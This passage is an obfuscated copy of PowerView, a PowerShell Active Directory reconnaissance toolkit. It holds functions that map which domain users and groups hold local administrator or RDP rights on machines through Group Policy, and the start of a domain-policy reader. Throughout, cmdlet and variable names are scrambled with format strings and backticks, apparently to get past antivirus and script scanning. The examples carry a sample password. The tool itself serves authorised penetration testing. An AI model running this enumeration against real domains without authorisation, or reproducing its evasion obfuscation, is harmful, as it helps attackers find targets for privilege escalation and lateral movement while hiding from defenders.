        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`V`eRt`iMe`LIMit},

        [Switch]
        ${TOM`Bs`TO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`de`NtIAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${CO`M`MON`ArgUMenTs} = @{}
        if (${P`sb`OuNdpA`RAmeters}['Domain']) { ${C`oMMO`N`ArGuME`Nts}['Domain'] = ${Do`mAiN} }
        if (${p`SbOu`NDp`Ar`AMeTeRs}['Server']) { ${coM`M`onarGuMen`TS}['Server'] = ${Se`Rv`eR} }
        if (${p`sbOuN`dpa`Ra`M`EterS}['SearchScope']) { ${cO`mmo`Na`Rgu`MenTS}['SearchScope'] = ${seARcH`S`cOpe} }
        if (${PsboUndP`Ar`AMET`e`Rs}['ResultPageSize']) { ${COmmOnArG`U`MEnTs}['ResultPageSize'] = ${RESU`LTpage`sIZE} }
        if (${psB`OuN`dParA`ME`TeRS}['ServerTimeLimit']) { ${c`oMm`onARG`UMEnTS}['ServerTimeLimit'] = ${s`eRV`ErtImel`im`IT} }
        if (${PSbOUndp`AR`Ame`TErs}['Tombstone']) { ${CoM`M`O`N`ArG`UMEnTS}['Tombstone'] = ${TO`mB`stoNe} }
        if (${Ps`BOunDp`Ar`AmeTers}['Credential']) { ${coM`MOnArg`U`MeNts}['Credential'] = ${CR`EDEN`TI`Al} }
    }

    PROCESS {
        ${TArG`eTS`i`Ds} = @()

        if (${P`SBoun`DpARAM`eTerS}['Identity']) {
            ${ta`RG`eTsiDs} += &("{2}{3}{1}{0}"-f 't','-DomainObjec','G','et') @CommonArguments -Identity ${i`d`ENT`iTY} | &("{0}{1}{2}" -f'Select-O','bjec','t') -Expand ("{3}{0}{2}{1}" -f 'ec','d','tsi','obj')
            ${TargE`TO`B`je`CtsId} = ${T`AR`GEtSIdS}
            if (-not ${target`s`iDS}) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            # no filtering/match all
            ${TaRG`ETs`Ids} = @('*')
        }

        if (${L`ocalG`Roup} -match 'S-1-5') {
            ${TAr`geT`LOCA`Ls`ID} = ${LOCaL`g`Ro`UP}
        }
        elseif (${LOCAl`G`Ro`UP} -match 'Admin') {
            ${T`ARGET`l`o`CalsID} = 'S-1-5-32-544'
        }
        else {
            # RDP
            ${TA`RGE`TLoca`lSid} = 'S-1-5-32-555'
        }

        if (${T`Ar`G`etsIdS}[0] -ne '*') {
            ForEach (${TARg`Et`siD} in ${tArg`etsi`ds}) {
                &("{3}{0}{2}{1}"-f'ri','e','te-Verbos','W') "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
                ${tA`RGeT`siDS} += &("{3}{0}{2}{1}" -f'et-DomainG','oup','r','G') @CommonArguments -Properties 'objectsid' -MemberIdentity ${TARge`Ts`ID} | &("{1}{0}{2}"-f 'ct-Objec','Sele','t') -ExpandProperty ("{1}{2}{0}"-f 'sid','obj','ect')
            }
        }

        &("{4}{2}{0}{1}{3}" -f 'Ve','rbos','rite-','e','W') "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
        &("{1}{0}{2}"-f'ri','W','te-Verbose') "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"

        ${GP`ogr`o`UpS} = &("{4}{0}{2}{1}{3}{5}"-f 'e','oc','t-DomainGPOL','alG','G','roup') @CommonArguments -ResolveMembersToSIDs | &("{2}{3}{0}{4}{1}" -f'O','ct','ForEach','-','bje') {
            ${Gp`OgrO`Up} = ${_}
            # if the locally set group is what we're looking for, check the GroupMembers ('members') for our target SID
            if (${g`P`oGROuP}.GroupSID -match ${t`A`RGEtlo`CA`lsiD}) {
                ${GPogr`OUP}.GroupMembers | &("{1}{2}{3}{0}" -f 'ect','Whe','r','e-Obj') {${_}} | &("{0}{2}{3}{1}"-f'ForE','ect','ach-Ob','j') {
                    if ( (${TaRgE`T`sids}[0] -eq '*') -or (${taR`GeT`s`IDS} -Contains ${_}) ) {
                        ${G`Po`gRoUp}
                    }
                }
            }
            # if the group is a 'memberof' the group we're looking for, check GroupSID against the targt SIDs
            if ( (${G`pogR`oUP}.GroupMemberOf -contains ${Tar`GETLoca`LsId}) ) {
                if ( (${T`AR`gEt`siDs}[0] -eq '*') -or (${tA`RgeTS`idS} -Contains ${g`P`OGRoup}.GroupSID) ) {
                    ${G`PoGro`Up}
                }
            }
        } | &("{0}{3}{1}{2}"-f'Sor','e','ct','t-Obj') -Property ("{1}{0}"-f'POName','G') -Unique

        ${gp`OgRO`UPs} | &("{3}{2}{0}{1}"-f'jec','t','-Ob','Where') {${_}} | &("{0}{2}{3}{1}"-f'ForEa','ct','ch-','Obje') {
            ${gP`o`NaME} = ${_}.GPODisplayName
            ${g`POgU`Id} = ${_}.GPOName
            ${g`poPa`TH} = ${_}.GPOPath
            ${gp`Oty`Pe} = ${_}.GPOType
            if (${_}.GroupMembers) {
                ${gpO`m`eMbers} = ${_}.GroupMembers
            }
            else {
                ${Gp`oMeMB`erS} = ${_}.GroupSID
            }

            ${filTE`Rs} = ${_}.Filters

            if (${t`ArgetSi`dS}[0] -eq '*') {
                # if the * wildcard was used, set the targets to all GPO members so everything it output
                ${TARgE`T`oBJ`ecT`sI`DS} = ${GPo`mem`BE`RS}
            }
            else {
                ${TARGEtOb`JE`c`Ts`i`dS} = ${TaRG`ET`oB`Ject`SiD}
            }

            # find any OUs that have this GPO linked through gpLink
            &("{0}{1}{2}" -f 'G','et-D','omainOU') @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink ${gp`O`gUiD} | &("{1}{2}{3}{0}{4}"-f 'bjec','F','o','rEach-O','t') {
                if (${FI`LTe`Rs}) {
                    ${OUc`oM`PUters} = &("{3}{2}{4}{0}{1}"-f 'ompute','r','omain','Get-D','C') @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase ${_}.Path | &("{0}{2}{1}" -f'Where-O','ect','bj') {${_}.distinguishedname -match (${FI`Lt`erS}.Value)} | &("{1}{3}{2}{0}"-f '-Object','Sel','t','ec') -ExpandProperty ("{3}{0}{1}{2}" -f'ns','ho','stname','d')
                }
                else {
                    ${oUCOM`P`Ute`RS} = &("{4}{2}{3}{1}{5}{0}"-f'er','Com','et','-Domain','G','put') @CommonArguments -Properties 'dnshostname' -SearchBase ${_}.Path | &("{2}{0}{1}" -f 'jec','t','Select-Ob') -ExpandProperty ("{1}{2}{3}{0}"-f 'me','d','ns','hostna')
                }

                if (${Ou`cOm`P`UTers}) {
                    if (${oUCOmp`UT`e`Rs} -isnot [System.Array]) {${oUCom`P`UT`ERs} = @(${oUc`om`pUTERS})}

                    ForEach (${t`ArGET`sId} in ${TaRGETOb`jeCTs`i`DS}) {
                        ${OBJ`E`cT} = &("{1}{3}{2}{0}{4}"-f 'Domai','G','-','et','nObject') @CommonArguments -Identity ${TAr`ge`Ts`id} -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        ${IS`GRo`Up} = @('268435456','268435457','536870912','536870913') -contains ${o`B`JecT}.samaccounttype

                        ${gPolOc`ALGROUPM`A`Pping} = &("{0}{2}{1}" -f'New','ect','-Obj') ("{1}{0}"-f'ect','PSObj')
                        ${GpOL`OcALG`RO`UpMa`PpINg} | &("{1}{0}{2}"-f'd-M','Ad','ember') ("{2}{0}{1}"-f'otepro','perty','N') 'ObjectName' ${ob`JecT}.samaccountname
                        ${GpOLOCA`l`GrO`UPM`AppING} | &("{1}{0}{2}" -f 'mbe','Add-Me','r') ("{0}{1}{2}" -f'No','te','property') 'ObjectDN' ${O`BjEcT}.distinguishedname
                        ${GPo`lO`C`ALGRoup`Map`pInG} | &("{2}{1}{3}{0}" -f'er','d','Ad','-Memb') ("{3}{2}{1}{0}" -f 'ty','er','rop','Notep') 'ObjectSID' ${obJe`ct}.objectsid
                        ${g`p`oL`oc`ALgro`UPMa`PpIng} | &("{0}{2}{1}" -f'Ad','ber','d-Mem') ("{0}{3}{2}{1}"-f'N','property','te','o') 'Domain' ${Dom`AiN}
                        ${Gpo`LOCa`L`GrOu`PmA`ppiNg} | &("{0}{3}{2}{1}" -f'A','er','mb','dd-Me') ("{0}{1}{3}{2}" -f'Not','ep','perty','ro') 'IsGroup' ${Is`GrouP}
                        ${GP`OLocaLGr`Oup`mAppI`NG} | &("{0}{1}{2}{3}" -f'Add-','M','embe','r') ("{0}{2}{1}" -f 'Note','roperty','p') 'GPODisplayName' ${GPon`Ame}
                        ${gP`OL`o`cALGR`OUPmA`ppi`Ng} | &("{2}{1}{0}"-f'er','Memb','Add-') ("{2}{0}{1}" -f 'tepro','perty','No') 'GPOGuid' ${Gpogu`Id}
                        ${gPO`Loc`Alg`RO`UP`maPPING} | &("{1}{0}{2}"-f'd','Ad','-Member') ("{3}{2}{1}{0}"-f 'y','rt','pe','Notepro') 'GPOPath' ${GpoPa`Th}
                        ${gpol`oC`ALGr`Ou`P`mAppinG} | &("{2}{0}{1}"-f'm','ber','Add-Me') ("{0}{1}{2}"-f'Notepr','ope','rty') 'GPOType' ${Gp`ot`YpE}
                        ${GpOlo`c`AlgR`oUpMap`p`inG} | &("{2}{0}{1}" -f 'mbe','r','Add-Me') ("{2}{3}{1}{0}" -f 'erty','teprop','N','o') 'ContainerName' ${_}.Properties.distinguishedname
                        ${g`POLo`CA`lG`ROu`PMaPp`ING} | &("{1}{3}{2}{0}"-f 'ember','A','M','dd-') ("{1}{0}{2}" -f 'ep','Not','roperty') 'ComputerName' ${oUc`oM`pUT`erS}
                        ${gpOL`oC`AlGrOu`p`M`APpInG}.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        ${g`po`LOCalGrou`pMaP`pi`NG}
                    }
                }
            }

            # find any sites that have this GPO linked through gpLink
            &("{2}{0}{1}" -f 'DomainSi','te','Get-') @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink ${gP`OgUid} | &("{2}{4}{0}{3}{1}" -f'-Ob','t','ForEac','jec','h') {
                ForEach (${tAr`GET`SId} in ${tarGeT`OBJ`E`C`T`siDS}) {
                    ${ob`JE`Ct} = &("{1}{0}{2}{3}" -f 'Dom','Get-','ainObj','ect') @CommonArguments -Identity ${TaR`g`EtSiD} -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    ${iS`GR`oup} = @('268435456','268435457','536870912','536870913') -contains ${O`BJeCT}.samaccounttype

                    ${gpO`L`Oc`ALgr`Ou`PMApPInG} = &("{3}{2}{0}{1}" -f'b','ject','O','New-') ("{0}{1}" -f'PSObj','ect')
                    ${Gp`o`LocaL`gr`Oup`MAPP`iNG} | &("{0}{2}{1}"-f 'Ad','-Member','d') ("{3}{0}{1}{2}" -f'te','prop','erty','No') 'ObjectName' ${oBJ`Ect}.samaccountname
                    ${Gp`oLOCAlgR`OU`PMA`p`pING} | &("{1}{2}{0}"-f 'ber','Add-M','em') ("{3}{0}{1}{2}" -f 'o','teprope','rty','N') 'ObjectDN' ${oBj`eCt}.distinguishedname
                    ${Gp`o`lo`cAlgROU`p`mA`PPInG} | &("{0}{2}{1}{3}"-f 'A','be','dd-Mem','r') ("{2}{3}{1}{0}" -f'y','rt','Noteprop','e') 'ObjectSID' ${o`Bj`ecT}.objectsid
                    ${gPO`loCALg`RoU`P`MA`PPING} | &("{2}{0}{3}{1}"-f'dd','Member','A','-') ("{1}{3}{2}{0}"-f 'rty','Not','ope','epr') 'IsGroup' ${isG`ROUP}
                    ${GPOLOcAl`GRoupMA`p`P`ING} | &("{3}{1}{0}{2}" -f'-Membe','d','r','Ad') ("{1}{2}{0}{3}"-f'roper','Note','p','ty') 'Domain' ${Do`MAiN}
                    ${G`POlOCAlGrOuPm`AP`pI`Ng} | &("{0}{2}{1}"-f'Add-Me','er','mb') ("{3}{0}{2}{1}"-f'ote','perty','pro','N') 'GPODisplayName' ${GPoN`AMe}
                    ${GPoLoC`ALG`RouPm`Ap`p`INg} | &("{0}{2}{1}"-f'Add-M','ber','em') ("{1}{2}{0}" -f 'rty','Notepro','pe') 'GPOGuid' ${gp`o`gUid}
                    ${GPoLocaLg`RouP`m`AppiNG} | &("{0}{1}{2}" -f'Add','-Mem','ber') ("{0}{1}{2}" -f'Notepro','p','erty') 'GPOPath' ${G`pOP`Ath}
                    ${Gp`olO`cAlG`R`OuPMapPInG} | &("{1}{2}{0}" -f'd-Member','A','d') ("{0}{1}{3}{2}"-f 'N','otep','erty','rop') 'GPOType' ${g`p`OtYPe}
                    ${Gp`oLoc`Al`gr`Oupm`ApPi`NG} | &("{1}{3}{2}{0}" -f'ember','A','-M','dd') ("{2}{3}{0}{1}"-f'pe','rty','Note','pro') 'ContainerName' ${_}.distinguishedname
                    ${GP`OLOC`ALgrO`UpMApP`I`NG} | &("{0}{1}{3}{2}"-f 'Add','-Me','er','mb') ("{2}{1}{0}" -f 'teproperty','o','N') 'ComputerName' ${_}.siteobjectbl
                    ${GP`OlOCalgrOU`p`MApP`Ing}.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    ${G`P`oLocAl`Gr`o`UpMAP`PINg}
                }
            }
        }
    }
}


function GE`T`-`d`OmAiN`gPoc`oMPutEr`LoCALGrouPm`APpiNg {
<#
.SYNOPSIS

Takes a computer (or GPO) object and determines what users/groups are in the specified
local group for the machine through GPO correlation.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainGPOLocalGroup  

.DESCRIPTION

This function is the inverse of Get-DomainGPOUserLocalGroupMapping, and finds what users/groups
are in the specified local group for a target machine through GPO correlation.

If a -ComputerIdentity is specified, retrieve the complete computer object, attempt to
determine the OU the computer is a part of. Then resolve the computer's site name with
Get-NetComputerSiteName and retrieve all sites object Get-DomainSite. For those results, attempt to
enumerate all linked GPOs and associated local group settings with Get-DomainGPOLocalGroup. For
each resulting GPO group, resolve the resulting user/group name to a full AD object and
return the results. This will return the domain objects that are members of the specified
-LocalGroup for the given computer.

Otherwise, if -OUIdentity is supplied, the same process is executed to find linked GPOs and
localgroup specifications.

.PARAMETER ComputerIdentity

A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local) for the computer to identity GPO local group mappings for.

.PARAMETER OUIdentity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) for the OU to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
or a custom local SID. Defaults to local 'Administrators'.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -ComputerName WINDOWS3.testlab.local

Finds users who have local admin rights over WINDOWS3 through GPO correlation.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP

Finds users who have RDP rights over WINDOWS4 through GPO correlation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOComputerLocalGroupMapping -Credential $Cred -ComputerIdentity SQL.testlab.local

.OUTPUTS

PowerView.GGPOComputerLocalGroupMember
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = ${T`RUE}, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${C`oMpu`TERI`DeNTIty},

        [Parameter(Mandatory = ${TR`Ue}, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        ${O`UIDENti`TY},

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        ${LoC`ALGR`o`Up} = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`MAIN},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`eAr`cHbAse},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RV`er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${se`ArcH`sCopE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rESULtp`AGE`s`IzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`Rv`E`RTImELImiT},

        [Switch]
        ${Tombs`TO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDential} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${coM`MoN`A`R`G`UmenTs} = @{}
        if (${PSBOUN`D`PArAMeT`E`Rs}['Domain']) { ${Co`Mm`OnArgu`MEnTS}['Domain'] = ${DoM`A`IN} }
        if (${PSBoU`NDpAR`AM`E`TErs}['Server']) { ${cOmMo`N`A`RgUme`NTs}['Server'] = ${Se`RvEr} }
        if (${PSBoUn`dPA`RamE`T`e`RS}['SearchScope']) { ${CO`mmONA`R`gU`mentS}['SearchScope'] = ${SEA`R`cHs`cope} }
        if (${p`sBO`Un`DpAr`AMEtErs}['ResultPageSize']) { ${Com`Mo`NAR`GUm`EnTS}['ResultPageSize'] = ${R`es`ULTp`AGeSi`ze} }
        if (${PS`BouNdPA`RA`mEt`eRS}['ServerTimeLimit']) { ${C`OM`Mon`ArGUMeN`Ts}['ServerTimeLimit'] = ${sE`RV`e`RTiMEliMIT} }
        if (${PS`Bo`Un`dpA`RamE`TErs}['Tombstone']) { ${c`o`MmoNa`RGU`MEnts}['Tombstone'] = ${tOm`BS`TO`NE} }
        if (${PSB`OunDPAr`AM`E`TErS}['Credential']) { ${CoMmO`NA`RGuMe`NTs}['Credential'] = ${CRe`DEn`TIaL} }
    }

    PROCESS {
        if (${PSB`oUNdPa`Rame`TE`RS}['ComputerIdentity']) {
            ${C`O`m`PUters} = &("{1}{3}{2}{0}{4}"-f 'nCom','G','-Domai','et','puter') @CommonArguments -Identity ${comPuTE`Ri`d`E`NT`ity} -Properties 'distinguishedname,dnshostname'

            if (-not ${co`m`Pu`TERS}) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }

            ForEach (${CO`mput`er} in ${C`o`mPutE`RS}) {

                ${Gpog`U`IdS} = @()

                # extract any GPOs linked to this computer's OU through gpLink
                ${D`N} = ${cOmp`U`TEr}.distinguishedname
                ${OUi`ND`ex} = ${dn}.IndexOf('OU=')
                if (${o`U`IndEx} -gt 0) {
                    ${OUN`AmE} = ${D`N}.SubString(${O`UInD`EX})
                }
                if (${OUN`AME}) {
                    ${GP`OgUiDs} += &("{1}{2}{0}"-f 'OU','Get-','Domain') @CommonArguments -SearchBase ${o`U`NAMe} -LDAPFilter '(gplink=*)' | &("{1}{2}{0}" -f't','ForEa','ch-Objec') {
                        &("{1}{2}{0}"-f'ing','Se','lect-Str') -InputObject ${_}.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{0}{1}"-f'-Obj','ect','ForEach') {${_}.Matches | &("{0}{1}{3}{2}" -f 'S','ele','ject','ct-Ob') -ExpandProperty ("{1}{0}"-f'e','Valu') }
                    }
                }

                # extract any GPOs linked to this computer's site through gpLink
                &("{1}{0}{2}"-f'ri','W','te-Verbose') "Enumerating the sitename for: $($Computer.dnshostname)"
                ${COmPU`T`eRs`ItE} = (&("{2}{4}{6}{0}{5}{3}{1}" -f 'Comput','iteName','Ge','rS','t','e','-Net') -ComputerName ${cO`mPu`TEr}.dnshostname).SiteName
                if (${c`OM`PuT`e`RSitE} -and (${c`OmPutE`RSiTe} -notmatch 'Error')) {
                    ${gpo`gu`I`ds} += &("{3}{2}{0}{1}" -f 'Do','mainSite','-','Get') @CommonArguments -Identity ${CO`M`pU`TErSI`Te} -LDAPFilter '(gplink=*)' | &("{0}{2}{1}{3}" -f'For','je','Each-Ob','ct') {
                        &("{1}{0}{2}" -f 't-S','Selec','tring') -InputObject ${_}.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{0}{2}{1}{3}"-f'F','e','orEach-Obj','ct') {${_}.Matches | &("{0}{3}{2}{1}"-f'Se','-Object','ect','l') -ExpandProperty ("{0}{1}" -f 'Valu','e') }
                    }
                }

                # process any GPO local group settings from the GPO GUID set
                ${GPog`UI`ds} | &("{2}{1}{4}{0}{3}" -f'Lo','nGP','Get-Domai','calGroup','O') @CommonArguments | &("{0}{1}{2}" -f 'Sort-','Obje','ct') -Property ("{1}{0}" -f'POName','G') -Unique | &("{3}{2}{1}{0}{4}" -f'O','rEach-','o','F','bject') {
                    ${GPO`gro`UP} = ${_}

                    if(${gp`ogRo`UP}.GroupMembers) {
                        ${GPOM`Em`B`erS} = ${g`P`Ogr`ouP}.GroupMembers
                    }
                    else {
                        ${G`Po`mEmbERS} = ${gPOGr`OUP}.GroupSID
                    }

                    ${g`pOmeMBe`Rs} | &("{2}{0}{1}"-f 'Each-Ob','ject','For') {
                        ${O`BJecT} = &("{2}{1}{0}{3}" -f 'nOb','i','Get-Doma','ject') @CommonArguments -Identity ${_}
                        ${Isg`RO`Up} = @('268435456','268435457','536870912','536870913') -contains ${Obj`ecT}.samaccounttype

                        ${GPO`comPute`R`LOCAlgRo`U`pme`MBER} = &("{2}{0}{3}{1}"-f'w-Obj','ct','Ne','e') ("{0}{1}{2}" -f 'PS','Obj','ect')
                        ${gpoCOmpU`TErLocALG`ROup`m`Em`B`Er} | &("{2}{1}{0}" -f 'er','-Memb','Add') ("{0}{1}{2}{3}"-f'Notepro','pe','rt','y') 'ComputerName' ${CO`mpuT`eR}.dnshostname
                        ${GPOcOmpU`T`eR`L`OC`A`lGr`OuPmEm`BER} | &("{1}{0}{2}" -f'be','Add-Mem','r') ("{2}{1}{0}{3}"-f 't','oper','Notepr','y') 'ObjectName' ${Ob`jE`cT}.samaccountname
                        ${g`POCOMpUterlOcA`l`GRouPM`e`mber} | &("{2}{1}{0}"-f'r','-Membe','Add') ("{1}{3}{0}{2}" -f 'r','Note','operty','p') 'ObjectDN' ${OB`je`Ct}.distinguishedname
                        ${GPOcoM`puter`lOCa`lg`R`oUpm`eMb`Er} | &("{0}{2}{1}"-f 'Add','ber','-Mem') ("{0}{3}{1}{2}"-f'Note','per','ty','pro') 'ObjectSID' ${_}
                        ${gp`oC`om`PU`TeRLoca`l`gROUpmE`Mb`er} | &("{0}{1}{2}" -f'Add','-Me','mber') ("{0}{3}{2}{1}" -f'Note','y','ropert','p') 'IsGroup' ${Isgr`Oup}
                        ${GpO`C`o`MPuTeRLO`cALg`RouP`membeR} | &("{1}{2}{3}{0}"-f'mber','A','dd-','Me') ("{0}{2}{3}{1}"-f 'N','ty','ote','proper') 'GPODisplayName' ${Gp`OG`ROUp}.GPODisplayName
                        ${Gpo`COMp`UterLocAlgR`O`U`pmEMbeR} | &("{0}{2}{1}"-f 'Add-','ember','M') ("{3}{1}{2}{0}" -f'operty','ep','r','Not') 'GPOGuid' ${GpO`gRO`UP}.GPOName
                        ${gPO`cOMPUtErlO`cA`L`grOUpmE`mB`Er} | &("{2}{1}{0}"-f'r','mbe','Add-Me') ("{0}{2}{1}"-f 'Notep','rty','rope') 'GPOPath' ${gp`og`RoUp}.GPOPath
                        ${gp`OC`Om`PutErlOC`AlgRouP`m`E`M`BeR} | &("{2}{0}{1}" -f'-Membe','r','Add') ("{3}{0}{2}{1}"-f'ote','y','propert','N') 'GPOType' ${gpoG`R`Oup}.GPOType
                        ${G`PocO`mPUT`ERlO`CalG`R`OUpMEMB`Er}.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        ${gp`ocOM`PuTeRlO`cAl`G`RoupMeMb`ER}
                    }
                }
            }
        }
    }
}


function gEt-`dO`m`A`In`polICY`DAta {
<#
.SYNOPSIS

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, ConvertFrom-SID  

.DESCRIPTION

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller using Get-DomainGPO.

.PARAMETER Domain

The domain to query for default policies, defaults to the current domain.

.PARAMETER Policy

Extract 'Domain', 'DC' (domain controller) policies, or 'All' for all policies.
Otherwise queries for the particular GPO name or GUID.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainPolicyData

Returns the default domain policy for the current domain.

.EXAMPLE

Get-DomainPolicyData -Domain dev.testlab.local

Returns the default domain policy for the dev.testlab.local domain.

.EXAMPLE

Get-DomainGPO | Get-DomainPolicy

Parses any GptTmpl.infs found for any policies in the current domain.

.EXAMPLE

Get-DomainPolicyData -Policy DC -Domain dev.testlab.local

Returns the policy for the dev.testlab.local domain controller.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainPolicyData -Credential $Cred

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('Source', 'Name')]
        [String]
        ${P`oL`icY} = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMA`In},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`Er`VER},

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RvE`RTiM`El`Im`IT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CredeN`T`iaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SEArc`h`era`RgUMeN`TS} = @{}
        if (${p`SbOUN`D`pAR`AMetErS}['Server']) { ${S`EARcheRar`gU`MEn`TS}['Server'] = ${sER`VER} }
        if (${PSbou`N`dPAr`AM`eT`eRs}['ServerTimeLimit']) { ${Se`ARc`HERaR`GUME`NtS}['ServerTimeLimit'] = ${Se`RVERTImeL`i`mIt} }
        if (${pSb`o`UNdPARam`E`TE`RS}['Credential']) { ${SEARchERa`RGu`M`e`NtS}['Credential'] = ${cRe`d`enTIaL} }

        ${CON`VERTA`RgU`m`ENTS} = @{}
        if (${psbo`UNdP`A`RaMe`TeRS}['Server']) { ${CoNVe`R`TA`RguMeNTS}['Server'] = ${sE`Rv`Er} }
        if (${pSbOuNdPaR`AME`TE`Rs}['Credential']) { ${COn`V`e`RT`ARGum`eNts}['Credential'] = ${c`R`EDen`TIAl} }
    }

    PROCESS {
        if (${PSBOunDpa`R`A`m`EtERs}['Domain']) {
            ${SEaR`CHErAR`gUM`ENTs}['Domain'] = ${DO`MAin}
            ${c`oNv`Er`TARGUMe`NtS}['Domain'] = ${DomA`IN}
        }

        if (${P`O`lICY} -eq 'All') {
            ${se`Ar`CheRaRgu`M`eN`TS}['Identity'] = '*'
        }
        elseif (${P`OlIcY} -eq 'Domain') {
            ${sEa`R`CHeR`A`RG`UMentS}['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${PO`Licy} -eq 'DomainController') -or (${POL`iCY} -eq 'DC')) {
            ${seA`RCheR`A`Rgu`MentS}['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${SEA`RC`HeRarG`U`MENTS}['Identity'] = ${POli`CY}
        }

        ${gP`o`REsults} = &("{2}{0}{1}{3}" -f'i','nG','Get-Doma','PO') @SearcherArguments

        ForEach (${g`pO} in ${g`pOReS`U`LTS}) {
            # grab the GptTmpl.inf file and parse it
